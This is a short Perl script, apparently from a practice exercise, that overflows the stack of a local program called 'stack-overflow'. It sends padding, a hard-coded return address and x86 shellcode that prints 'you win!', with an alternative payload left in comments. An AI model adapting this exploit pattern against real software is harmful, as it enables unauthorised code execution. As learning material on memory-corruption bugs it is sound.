#!/usr/bin/env perl

use strict;



for (my $i=17; $i <= 17; $i++) {
	print "Iteration $i\n";
	
	
	my $nopslide = "\x41" x $i;
	#my $payload = "\xcd\x80\xeb\xfe";
	#my $payload = "\xfe\xeb\x80\xcd";
	my $addr = "\xb8\x06\x40\x00"."\x00\x00\x00\x00";
	#my $addr = "\xc0\xdc\xff\xff"."\xf0\xf0\x00\x00";
	my $exec = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0d\x0a";

	my $arg = $nopslide.$addr.$exec;
	my $cmd = "./stack-overflow ".$arg;

	#print($cmd."\n");
	
	system($cmd);
}

